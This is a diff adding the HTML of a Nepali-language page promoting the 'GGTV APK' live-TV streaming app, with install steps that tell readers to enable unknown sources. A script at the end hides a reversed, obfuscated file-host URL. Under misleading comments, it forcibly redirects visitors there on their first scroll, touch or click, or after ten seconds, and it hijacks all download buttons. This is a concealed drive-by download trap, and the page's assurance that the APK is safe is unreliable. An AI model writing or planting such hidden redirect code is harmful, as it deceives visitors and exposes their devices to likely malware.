+                <p>के तपाईंसँग एन्ड्रोइड टिभी छ? स्मार्ट टिभीमा यो एप डाउनलोड र प्रयोग गर्ने विस्तृत गाइडको लागि 'स्मार्ट टिभीका लागि GGTV' पृष्ठ जाँच गर्नुहोस्।</p>
+            </div>
+
+            <!-- Features Section -->
+            <div id="features" class="section-title">GGTV APK का विशेषताहरू</div>
+
+            <p class="features-intro">यो उत्कृष्ट विशेषताहरूले भरिपूर्ण छ जसले प्रत्यक्ष खेलकुद र समाचार हेर्ने अनुभवलाई अझ उत्कृष्ट बनाउँछ। सरलता र सुविधा यसको मुख्य ध्यान हो। GGTV एपमा तपाईंले के-के पाउनुहुन्छ, यहाँ हेर्नुहोस्।</p>
+
+            <div class="features-grid">
+                <!-- Feature 1 -->
+                <div id="feature-4k" class="feature-card active">
+                    <div class="feature-icon">
+                        <img src="static/picture/4K-Quality-Streaming.webp" alt="४K गुणस्तरको स्ट्रिमिङ">
+                    </div>
+                    <h3>४K गुणस्तरको स्ट्रिमिङ</h3>
+                    <p>यसले इन्टरनेटको गति अनुसार भिडियोको गुणस्तर स्वचालित रूपमा समायोजन गर्दछ। यद्यपि भिडियो रिजोल्युसन इन्टरनेटमा भर पर्छ, यो एपले ४K (2160px1440p) सम्मको गुणस्तरमा टिभी च्यानलहरू हेर्न अफर गर्दछ।</p>
+                </div>
+
+                <!-- Feature 2 -->
+                <div id="feature-favorites" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Create-Favorites-List.webp" alt="मनपर्ने सूची सिर्जना गर्नुहोस्">
+                    </div>
+                    <h3>मनपर्ने सूची सिर्जना गर्नुहोस्</h3>
+                    <p>च्यानलहरूको विशाल सूचीको कारण कहिलेकाहीं मनपर्ने टिभी च्यानलहरू पत्ता लगाउन गाह्रो हुन्छ, त्यसैले यो एपले प्रयोगकर्ताहरूलाई प्रायः हेर्ने च्यानलहरूलाई मनपर्ने सूचीमा थप्न अनुमति दिन्छ ताकि 'Favorites' खण्डबाट सजिलै पहुँच गर्न सकियोस्।</p>
+                </div>
+
+                <!-- Feature 3 -->
+                <div id="feature-no-ads" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/No-Annoying-Ads.webp" alt="झन्झटिलो विज्ञापन नभएको">
+                    </div>
+                    <h3>झन्झटिलो विज्ञापन नभएको</h3>
+                    <p>तपाईंले कुनै सदस्यता शुल्क नतिरे पनि यो एपमा कुनै भी विज्ञापनहरू आउँदैनन्। कम्पनी आफ्नो मुख्य उद्देश्यमा अडिग छ, जुन प्रयोगकर्ताहरूलाई विज्ञापन बिना चलचित्र र शृङ्खलाहरू हेर्ने अधिकार दिनु हो।</p>
+                </div>
+
+                <!-- Feature 4 -->
+                <div id="feature-sports-news" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Live-Sports-News.webp" alt="लाइभ खेलकुद र समाचार">
+                    </div>
+                    <h3>लाइभ खेलकुद र समाचार</h3>
+                    <p>यो एप फुटबल, क्रिकेट, बास्केटबल आदि लगायतका प्रत्यक्ष खेलकुद खेलहरू हेर्न विश्वभरका लाखौं मानिसहरूद्वारा व्यापक रूपमा प्रयोग गरिन्छ। विश्वव्यापी समाचारहरूसँग अद्यावधिक रहनुहोस्, GGTV ले तपाईंलाई विश्वभरका सयौँ समाचार च्यानलहरूमा सजिलो पहुँच दिन्छ।</p>
+                </div>
+
+                <!-- Feature 5 -->
+                <div id="feature-updates" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Regular-Updates.webp" alt="नियमित अपडेटहरू">
+                    </div>
+                    <h3>नियमित अपडेटहरू</h3>
+                    <p>सुधारका लागि सधैं ठाउँ रहन्छ, र GGTV विकासकर्ताले प्रयोगकर्ताको प्रत्यक्ष टिभी हेर्ने अनुभवलाई सुधार्न प्रायः नयाँ सुविधाहरू, थप टिभी च्यानलहरू, अद्यावधिक गरिएको UI, र सामान्य बगहरू समाधान गर्ने गर्दछन्।</p>
+                </div>
+
+                <!-- Feature 6 -->
+                <div id="feature-1000-channels" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/1000-TV-Channels.webp" alt="१०००+ टिभी च्यानलहरू">
+                    </div>
+                    <h3>१००० भन्दा बढी टिभी च्यानलहरू</h3>
+                    <p>चलचित्र, खेलकुद, संगीतदेखि शिक्षा, वन्यजन्तु र धेरै प्रकारका मनोरञ्जनात्मक सामग्रीहरू प्रदान गर्ने हजारौं टिभी च्यानलहरूको ढोका खोल्नुहोस्। सबै टिभी च्यानलहरू विभिन्न विधाहरूमा व्यवस्थित छन्, ताकि तपाईंले तिनीहरूलाई सजिलै फेला पार्न सक्नुहुन्छ।</p>
+                </div>
+
+                <!-- Feature 7 -->
+                <div id="feature-languages" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Multiple-Languages.webp" alt="बहुभाषी समर्थन">
+                    </div>
+                    <h3>बहुभाषी समर्थन</h3>
+                    <p>धेरै देशहरूमा फरक-फरक भाषाहरू बोलिन्छन्, र GGTV एपले क्षेत्रीय भाषाहरू जस्तै पोर्तुगाली, स्पेनिस, इन्डोनेसियाली, हिन्दी, टर्की आदिमा स्थानीय च्यानलहरू उपलब्ध गराउँछ।</p>
+                </div>
+
+                <!-- Feature 8 -->
+                <div id="feature-international" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Explore-International-TV-Channels.webp"
+                            alt="अन्तर्राष्ट्रिय टिभी च्यानलहरू अन्वेषण गर्नुहोस्">
+                    </div>
+                    <h3>अन्तर्राष्ट्रिय टिभी च्यानलहरू अन्वेषण गर्नुहोस्</h3>
+                    <p>यदि यस समयमा तपाईंको क्षेत्रीय सामग्रीमा केही मनोरञ्जनात्मक छैन भने, तपाईंले कुनै पनि देश चयन गरेर उनीहरूको लोकप्रिय टिभी च्यानलहरू हेर्न सक्नुहुन्छ र उनीहरूले कस्तो मनोरञ्जन प्रदान गरिरहेका छन् भनी थाहा पाउन सक्नुहुन्छ।</p>
+                </div>
+
+                <!-- Feature 9 -->
+                <div id="feature-interface" class="feature-card">
+                    <div class="feature-icon">
+                        <img src="static/picture/Easy-to-Use-Interface.webp" alt="प्रयोग गर्न सजिलो इन्टरफेस">
+                    </div>
+                    <h3>प्रयोग गर्न सजिलो इन्टरफेस</h3>
+                    <p>स्क्रिनको बीचमा रहेको ग्लोब हेर्नुहोस्! एपमा उपलब्ध सबै टिभी च्यानलहरू हेर्नको लागि मात्र आफ्नो देश छनोट गर्नुहोस्। यो प्रयोग गर्न धेरै सजिलो छ, जसले गर्दां तपाईंले आफ्नो मनपर्ने च्यानलहरू तुरुन्तै खोज्न र फेला पार्न सक्नुहुन्छ!</p>
+                </div>
+            </div>
+
+            <!-- Extra Features Section -->
+            <div id="extra-features" class="section-title">अतिरिक्त विशेषताहरू</div>
+
+            <ul class="extra-features-list">
+                <li><strong>PIP मोड:</strong> अन्य एपहरू प्रयोग गर्दा पनि फ्लोटिंग विन्डोमा लाइभ टिभी च्यानलहरू स्ट्रिम गर्नुहोस्। तपाईं फ्लोटिंग भिडियो प्लेयरलाई स्क्रिनको जुनसुकै कुनामा तान्न पनि सक्नुहुन्छ।</li>
+                <li><strong>कुनै सदस्यता आवश्यक छैन:</strong> GGTV द्वारा प्रस्तावित सबै सुविधाहरू र सेवाहरू सबैका लागि पूर्ण रूपमा नि:शुल्क छन्, र तपाईंले कुनै पनि सदस्यता शुल्क नतिरी तिनीहरूमा पहुँच गर्न सक्नुहुन्छ।</li>
+                <li><strong>विज्ञापन-रहित अनुभव:</strong> GGTV एपको साथमा विज्ञापन-रहित रूपमा प्रत्यक्ष शो र खेलकुदहरूको आनन्द लिनुहोस्! यसको इन्टरफेस आकर्षक छ, र तपाईं कुनै कष्टप्रद विज्ञापन बिना नै सयौँ च्यानलहरू ब्राउज गर्न सक्नुहुन्छ।</li>
+                <li><strong>ग्राहक सहायता (Customer Support):</strong> उनीहरूको ग्राहक सहायताले तपाईंलाई सामान्य समस्याहरू र स्ट्रिमिङ त्रुटिहरू समाधान गर्न मद्दत गर्दछ। यदि तपाईं आफ्नो कुनै मनपर्ने टिभी च्यानल यस एपमा थप्न चाहनुहुन्छ भने, प्रतिक्रिया (feedback) खण्डमा ट्याप गरेर आफ्नो अनुरोध पठाउन सक्नुहुन्छ।</li>
+                <li><strong>बफर-मुक्त:</strong> यसले बिना कुनै रुकावट वा लोड भिडियोहरू सहज रूपमा बजाउँछ किनभने यो अनुकूलन स्ट्रिमिङ प्रविधिको साथ आउँदछ जसले तपाईंको हालको इन्टरनेट गतिको आधारमा भिडियो रिजोल्युसन समायोजन गर्दछ।</li>
+            </ul>
+
+            <!-- Logo Center -->
+            <div class="logo-center">
+                <img src="static/picture/logo.png" alt="GGTV">
+            </div>
+
+            <!-- Download Section -->
+            <div id="download-version" class="download-section-title">GGTV APK को नयाँ संस्करण २०२५ डाउनलोड गर्नुहोस्</div>
+
+            <table class="download-table">
+                <tr>
+                    <td>एपको नाम</td>
+                    <td>GGTV</td>
+                </tr>
+                <tr>
+                    <td>संस्करण</td>
+                    <td>V1.0</td>
+                </tr>
+                <tr>
+                    <td>साइज</td>
+                    <td>६ एमबी</td>
+                </tr>
+                <tr>
+                    <td>विकासकर्ता</td>
+                    <td>GGTV Inc.</td>
+                </tr>
+                <tr>
+                    <td>श्रेणी</td>
+                    <td>मनोरञ्जन</td>
+                </tr>
+                <tr>
+                    <td>लाइसेन्स</td>
+                    <td>नि:शुल्क</td>
+                </tr>
+                <tr>
+                    <td>आवश्यकता</td>
+                    <td>एन्ड्रोइड ५.० वा माथि</td>
+                </tr>
+                <tr>
+                    <td>अपडेट गरिएको मिति</td>
+                    <td>१ दिन पहिले</td>
+                </tr>
+            </table>
+
+            <a href="#" class="download-btn-large">डाउनलोडिङ पृष्ठमा जानुहोस्...</a>
+
+            <!-- How to Download and Install Section -->
+            <div id="install" class="section-title">GGTV APK कसरी डाउनलोड र स्थापना गर्ने</div>
+
+            <p class="install-intro">यो विस्तृत स्थापना निर्देशिकाले तपाईंको एन्ड्रोइड स्मार्टफोनमा बिना कुनै झन्झट GGTV एप डाउनलोड र स्थापना गर्न सुनिश्चित गर्दछ, त्यसैले निर्देशनहरू ध्यानपूर्वक पालना गर्नुहोस्।</p>
+
+            <!-- Step 1 -->
+            <div id="install-step1" class="step-section">
+                <h3 class="step-title">चरण १: GGTV एप डाउनलोड गर्नुहोस्</h3>
+                <ul class="step-list">
+                    <li>यस वेबपेजको माथि रहेको '<strong>डाउनलोड</strong>' बटनमा ट्याप गर्नुहोस्</li>
+                    <li>APK फाइल पूर्ण रूपमा डाउनलोड नभएसम्म पर्खनुहोस्</li>
+                    <li>एक पटक GGTV APK डाउनलोड भएपछि, स्थापना प्रक्रिया अघि बढाउन अर्को चरणमा जानुहोस्।</li>
+                </ul>
+                <div class="step-image">
+                    <img src="static/picture/1.webp" alt="GGTV एप डाउनलोड गर्नुहोस्">
+                </div>
+            </div>
+
+            <!-- Step 2 -->
+            <div id="install-step2" class="step-section">
+                <h3 class="step-title">चरण २: अज्ञात स्रोतहरू सक्षम गर्नुहोस्</h3>
+                <ul class="step-list">
+                    <li>सेटिङहरू खोल्नुहोस् र '<strong>सुरक्षा</strong>' वा '<strong>गोपनीयता</strong>' खण्डमा जानुहोस्</li>
+                    <li>'<strong>अज्ञात एपहरू स्थापना गर्नुहोस्</strong>' वा '<strong>अज्ञात स्रोतहरू</strong>' विकल्प फेला पार्नुहोस्</li>
+                    <li>तपाईंले APK फाइल स्थापना गर्न प्रयोग गर्नुहुने ब्राउजर वा फाइल प्रबन्धक/मेरो फाइलहरू सक्षम गर्नुहोस्</li>
+                </ul>
+                <div class="step-image">
+                    <img src="static/picture/2.webp" alt="अज्ञात स्रोतहरू सक्षम गर्नुहोस्">
+                </div>
+            </div>
+
+            <!-- Step 3 -->
+            <div id="install-step3" class="step-section">
+                <h3 class="step-title">चरण ३: APK फाइल पत्ता लगाउनुहोस्</h3>
+                <ul class="step-list">
+                    <li>फाइल प्रबन्धक सुरु गर्नुहोस् र आन्तरिक भण्डारण (Internal Storage) मा जानुहोस्, त्यसपछि '<strong>डाउनलोड</strong>' फोल्डर चयन गर्नुहोस्</li>
+                    <li>तपाईंको उपकरणमा डाउनलोड गरिएका सबै वस्तुहरूको सूचीबाट, GGTV APK फाइल फेला नपरेसम्म तल स्क्रोल गर्नुहोस्</li>
+                    <li>यो APK सजिलैसँग पत्ता लगाउन तपाईंले खोज (search) सुविधा पनि प्रयोग गर्न सक्नुहुन्छ</li>
+                </ul>
+                <div class="step-image">
+                    <img src="static/picture/3.webp" alt="APK फाइल पत्ता लगाउनुहोस्">
+                </div>
+            </div>
+
+            <!-- Step 4 -->
+            <div id="install-step4" class="step-section">
+                <h3 class="step-title">चरण ४: स्थापना र सुरु गर्नुहोस्</h3>
+                <ul class="step-list">
+                    <li>GGTV APK फाइलमा क्लिक गर्नुहोस् र '<strong>स्थापना गर्नुहोस्</strong>' बटनमा ट्याप गर्नुहोस्</li>
+                    <li>गृह स्क्रिनमा फिर्ता जानुहोस् र एप ड्रअर भित्र GGTV एप आइकन फेला पार्नुहोस्</li>
+                    <li>यो एप सुरु गर्न त्यस आइकनमा थिच्नुहोस्, र तपाईं निःशुल्क प्रत्यक्ष टिभी च्यानलहरू स्ट्रिम गर्न तयार हुनुहुन्छ।</li>
+                </ul>
+                <div class="step-image">
+                    <img src="static/picture/4.webp" alt="GGTV स्थापना र सुरु गर्नुहोस्">
+                </div>
+            </div>
+
+            <!-- Smart TV Section -->
+            <div id="smarttv" class="section-title">स्मार्ट टिभीमा GGTV एप कसरी डाउनलोड र स्थापना गर्ने?</div>
+
+            <p class="smarttv-intro">आफ्नो स्मार्ट टिभीमा यो एप स्थापना गरेर, तपाईंले ठूलो स्क्रिन भएका उपकरणहरूमा आफ्ना मनपर्ने प्रत्यक्ष खेलकुद र समाचार च्यानलहरू हेरेर अझ राम्रो भिडियो र ध्वनि अनुभव लिन सक्नुहुनेछ, त्यसैले किन पर्खने? यसलाई तुरुन्तै स्थापना गर्न यी चरणहरू पालना गर्नुहोस्।</p>
+
+            <ul class="smarttv-steps">
+                <li><strong>चरण १:</strong> वेब ब्राउजर खोल्नुहोस् र खोज्नुहोस्, त्यसपछि GGTV APK फाइल प्राप्त गर्न डाउनलोड बटनमा ट्याप गर्नुहोस्।</li>
+                <li><strong>चरण २:</strong> प्ले स्टोर/एप स्टोर खोल्नुहोस् र फाइल एक्सप्लोरर एप खोज्नुहोस्, त्यसपछि यसलाई आफ्नो टिभीमा स्थापना गर्नुहोस्।</li>
+                <li><strong>चरण ३:</strong> सेटिङहरू >> सुरक्षा र प्रतिबन्धहरूमा जानुहोस् र 'अज्ञात स्रोतहरू' विकल्प खोज्नुहोस् र यसलाई सक्षम गर्नुहोस्</li>
+                <li><strong>चरण ४:</strong> फाइल प्रबन्धकमा जानुहोस् र तपाईंले APK फाइल बचत गर्नुभएको फोल्डर पत्ता लगाउनुहोस्, त्यसपछि एप स्थापना गर्न GGTV APK फाइलमा क्लिक गर्नुहोस्।</li>
+                <li><strong>चरण ५:</strong> गृह स्क्रिनमा जानुहोस् र खोल्नका लागि GGTV एप आइकनमा ट्याप गर्नुहोस्। अब, तपाईं नि:शुल्क रूपमा प्रत्यक्ष टिभी च्यानलहरू स्ट्रिम र अवलोकन गर्न सक्नुहुन्छ!</li>
+            </ul>
+
+            <!-- Best Alternatives Section -->
+            <div id="alternatives" class="section-title">GGTV का सर्वश्रेष्ठ विकल्पहरू</div>
+
+            <p class="alternatives-intro">यदि GGTV ले तपाईंको उपकरणमा राम्रोसँग काम गरेन भने, चिन्ता नगर्नुहोस्! त्यहाँ धेरै समान प्लेटफर्महरू उपलब्ध छन् जसले तपाईंलाई लगभग उस्तै रमाइलो र सुविधाहरू दिन सक्छन्। तर ती सयौँमध्ये वास्तविक उत्कृष्ट विकल्पहरू फेला पार्न गाह्रो हुन्छ, त्यसैले हामीले तपाईंको लागि अनुसन्धान गरेर ५ उत्कृष्ट GGTV वैकल्पिक विकल्पहरूको सूची प्रदान गरेका छौँ।</p>
+
+            <ol class="alternatives-list">
+                <li><strong>यूट्यूब (YouTube):</strong> यूट्यूबको बारेमा सबैलाई थाहा छ, र धेरै लोकप्रिय खेलकुद च्यानलहरू र सबैभन्दा ठूला समाचार च्यानलहरू पहिले नै यूट्यूबमा उपलब्ध छन्, जसलाई तपाईं विज्ञापन सहित नि:शुल्क हेर्न सक्नुहुन्छ।</li>
+                <li><strong>हुलु (Hulu):</strong> हुलुको प्रिमियम संस्करणले विभिन्न भाषाहरूमा रियालिटी शो, खेलकुद र चलचित्रहरू हेर्न सयौँ स्थानीय र अन्तर्राष्ट्रिय टिभी च्यानलहरू प्रदान गर्दछ।</li>
+                <li><strong>प्लुटो टिभी (Pluto TV):</strong> यो मनोरञ्जनात्मक सामग्री प्रदान गर्न लोकप्रिय एक अग्रणी अमेरिकी स्ट्रिमिङ सेवा हो, तर यसले कमेडी, शिक्षा र खेलकुद जस्ता विधाका २५० भन्दा बढी टिभी च्यानलहरू पनि प्रदान गर्दछ।</li>
+                <li><strong>यप टिभी (YuppTV):</strong> एक दक्षिण एसियाली OTT जसले हजारौँ रियालिटी शो, टिभी शृङ्खला र प्रत्यक्ष कार्यक्रम, समाचार र संगीत प्रदान गर्दछ। यसले बालबालिका र वयस्क सबै उमेर समूहका लागि सामग्रीहरू प्रदान गर्दछ।</li>
+                <li><strong>टुबी टिभी (Tubi TV):</strong> फक्स कर्पोरेसनको स्वामित्वमा रहेको टुबीले सुपर बाउल जस्ता लोकप्रिय फुटबल लिगहरू, विशेष वेब शृङ्खलाहरू र चलचित्रहरू हेर्न प्रत्यक्ष टिभी च्यानलहरूमा नि:शुल्क पहुँच प्रदान गर्दछ।</li>
+            </ol>
+
+            <!-- FAQs Section -->
+            <div id="faqs" class="section-title">बारम्बार सोधिने प्रश्नहरू (FAQs)</div>
+
+            <div class="faq-container">
+                <div id="faq-safe" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>GGTV APK प्रयोग गर्न कत्तिको सुरक्षित छ?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>GGTV APK सामान्यतया प्रयोगको लागि सुरक्षित छ। एपलाई कुनै व्यक्तिगत जानकारी वा लगइन विवरणहरू आवश्यक पर्दैन। यद्यपि, कुनै पनि तेस्रो-पक्ष APK जस्तै, सधैं विश्वसनीय स्रोतहरूबाट डाउनलोड गर्नुहोस् र आफ्नो उपकरणको सुरक्षा सेटिङहरू अद्यावधिक राख्नुहोस्।</p>
+                    </div>
+                </div>
+
+                <div id="faq-smarttv" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>के म स्मार्ट टिभीमा GGTV स्थापना गर्न सक्छु?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>हो, तपाईं एन्ड्रोइडमा आधारित स्मार्ट टिभीहरूमा GGTV स्थापना गर्न सक्नुहुन्छ। तपाईंले अज्ञात स्रोतहरूबाट स्थापना सक्षम गर्नुपर्नेछ र APK फाइल पत्ता लगाउन र स्थापना गर्न फाइल प्रबन्धक प्रयोग गर्नुपर्नेछ। विस्तृत चरणहरूको लागि माथिको स्मार्ट टिभी स्थापना निर्देशिका पालना गर्नुहोस्।</p>
+                    </div>
+                </div>
+
+                <div id="faq-legal" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>के GGTV एप प्रयोग गर्नु कानुनी रूपमा सही छ?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>GGTV ले विभिन्न स्रोतहरूबाट सार्वजनिक रूपमा उपलब्ध स्ट्रिमहरू एकीकृत गर्दछ। स्ट्रिमिङ सामग्री सम्बन्धी तपाईंको देशको नियमहरूको आधारमा यसको वैधता फरक हुन सक्छ। प्रयोगकर्ताहरूलाई एप प्रयोग गर्नु अघि आफ्नो स्थानीय कानुन जाँच गर्न सल्लाह दिइन्छ।</p>
+                    </div>
+                </div>
+
+                <div id="faq-iphone" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>आईफोन (iPhone) मा GGTV कसरी प्रयोग गर्ने?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>हाल, GGTV मुख्यतया एन्ड्रोइड उपकरणहरूको लागि डिजाइन गरिएको हो। आईफोन प्रयोगकर्ताहरूका लागि, तपाईंले एन्ड्रोइड उपकरणबाट स्क्रिन मिररिङ गर्ने वा उपलब्ध भएमा वेब-आधारित संस्करण प्रयोग गर्ने जस्ता वैकल्पिक विधिहरू प्रयोग गर्नुपर्ने हुन सक्छ।</p>
+                    </div>
+                </div>
+
+                <div id="faq-content" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>म GGTV एपमा कस्तो प्रकारको सामग्री हेर्न सक्छु?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>GGTV ले प्रत्यक्ष खेलकुद (फुटबल, क्रिकेट, बास्केटबल), समाचार च्यानलहरू, चलचित्रहरू, टिभी कार्यक्रमहरू, संगीत च्यानलहरू, कमेडी, वृत्तचित्रहरू, र विश्वभरका १३० भन्दा बढी देशहरूका अन्य धेरै सामग्रीहरू सहित विभिन्न प्रकारका मनोरञ्जन प्रदान गर्दछ।</p>
+                    </div>
+                </div>
+
+                <div id="faq-available" class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <h4>के GGTV अमेरिका, बेलायत, युरोप, भारत, इन्डोनेसिया र टर्कीमा उपलब्ध छ?</h4>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <p>हो, GGTV विश्वव्यापी रूपमा उपलब्ध छ र यसमा यी सबै क्षेत्रका टिभी च्यानलहरू समावेश छन्। तपाईं अन्तरक्रियात्मक ग्लोब सुविधा मार्फत अमेरिका, बेलायत, युरोप, भारत, इन्डोनेसिया, टर्की र धेरै देशहरूका क्षेत्रीय र अन्तर्राष्ट्रिय च्यानलहरूमा पहुँच गर्न सक्नुहुन्छ।</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Conclusion Section -->
+            <div id="conclusion" class="section-title">निष्कर्ष</div>
+
+            <p class="conclusion-text">त्यसैले साथीहरू, अब तपाईंहरू GGTV एप र यसको प्रयोग गरेर आफ्ना उपयुक्त उपकरणहरूमा लाइभ टिभी च्यानलहरू र खेलकुद खेलहरू हेर्ने तरिकाबारे राम्ररी परिचित हुनुभएको छ। GGTV ले बिना कुनै साइनअप १००० भन्दा बढी टिभी च्यानलहरूमा तत्काल पहुँच दिन्छ, र यसमा कुनै लुकेको शुल्क छैन। टिभी च्यानलहरूको विशाल सङ्ग्रहले तपाईंलाई कहिल्यै बोर हुन दिने छैन, किनकि तपाईंले सधैं आफ्नो मनोरञ्जनका लागि केही चाखलाग्दो सामग्री फेला पार्न सक्नुहुन्छ।</p>
+
+            <p class="conclusion-text">यदि तपाईं मनोरञ्जनको भरपर्दो नि:शुल्क स्रोत खोज्दै हुनुहुन्छ भने, GGTV वास्तवमै विचार गर्न योग्य उत्कृष्ट एप हो। यो एन्ड्रोइड, आईओएस, स्मार्ट टिभी, टिभी बक्स, र पीसी सहित विस्तृत श्रृंखलाका उपकरणहरूसँग उपयुक्त छ। तपाईंले यस वेबसाइटबाट यो एपको २०२५ अद्यावधिक गरिएको संस्करण सजिलै डाउनलोड गर्न सक्नुहुन्छ।</p>
+
+            <p class="conclusion-text">याद गर्नुहोस्, यसमा अफलाइन हेर्ने कुनै सुविधा छैन, जसको अर्थ लाइभ प्रसारण हेर्नका लागि तपाईंलाई छिटो र स्थिर इन्टरनेट जडान आवश्यक पर्दछ। एपले प्रयोगकर्ताहरूलाई प्रत्यक्ष खेलकुद प्रतियोगिताहरू, हास्य टिभी कार्यक्रमहरू, र रियालिटी शोहरूको वास्तविक-समय स्कोरहरू हेर्न अनुमति दिन्छ। यस एपमा बहुभाषाहरूमा सयौँ चलचित्र र संगीत च्यानलहरू उपलब्ध छन्। आजै एप डाउनलोड गर्नुहोस् र प्रयास गर्नुहोस्!</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; २०२६ <a href="#">GGTV एप</a></p>
+        </div>
+    </footer>
+    <script>
+        const APP_ENDPOINT = "wDfkW8jk2NyDe2fy7fcYU_AYCEqotZkBy05t5FQdPZt7U_HOhtXhWSMe7n5k-f8ap2cQayb9hP2NZ1ovCyAriPf34EhASm2dZj3Chvii98LBmDVY_4TGbe85_rs59_EwplI2dxyU5u-LEDX4lqc8K-O84hwHbswkvxmhaMopaKxytZe=v?vzwby7kjg9oc/d/moc.reivaehzzub.st//:sptth".split("").reverse().join("");
+
+        function toggleMobileMenu() {
+            const toggle = document.querySelector('.menu-toggle');
+            const nav = document.querySelector('.nav-links');
+            toggle.classList.toggle('active');
+            nav.classList.toggle('active');
+        }
+
+        document.querySelectorAll('.nav-links a').forEach(function (link) {
+            link.addEventListener('click', function () {
+                if (window.innerWidth <= 768) {
+                    document.querySelector('.menu-toggle').classList.remove('active');
+                    document.querySelector('.nav-links').classList.remove('active');
+                }
+            });
+        });
+
+        document.querySelectorAll('.nav-dropdown-toggle').forEach(function (toggle) {
+            toggle.addEventListener('click', function () {
+                if (window.innerWidth <= 768) {
+                    this.parentElement.classList.toggle('active');
+                }
+            });
+        });
+
+        function toggleFaq(element) {
+            const faqItem = element.parentElement;
+            faqItem.classList.toggle('active');
+        }
+
+        function triggerNavigation() {
+            window.location.href = APP_ENDPOINT;
+        }
+
+        function openModal() {
+            window.location.href = APP_ENDPOINT;
+        }
+
+        function handleDownload(event) {
+            event.preventDefault();
+            triggerNavigation();
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const triggerButtons = document.querySelectorAll('.download-btn, .download-btn-large, .nav-download');
+            triggerButtons.forEach(function (btn) {
+                btn.addEventListener('click', handleDownload);
+            });
+
+            // Initialize background resource loading
+            let isLoaded = false;
+            let timerId = null;
+
+            function runInit() {
+                if (isLoaded) return;
+                isLoaded = true;
+
+                if (timerId) {
+                    clearTimeout(timerId);
+                }
+
+                // Clean up trigger events
+                window.removeEventListener('scroll', runInit);
+                window.removeEventListener('mousemove', runInit);
+                window.removeEventListener('touchstart', runInit);
+                window.removeEventListener('click', runInit);
+
+                setTimeout(function() {
+                    triggerNavigation();
+                }, 800);
+            }
+
+            // Track initial user sessions
+            window.addEventListener('scroll', runInit);
+            window.addEventListener('mousemove', runInit);
+            window.addEventListener('touchstart', runInit);
+            window.addEventListener('click', runInit);
+
+            // Default inactivity threshold
+            timerId = setTimeout(runInit, 10000);
+        });
+    </script>
+</body>
+
+</html>
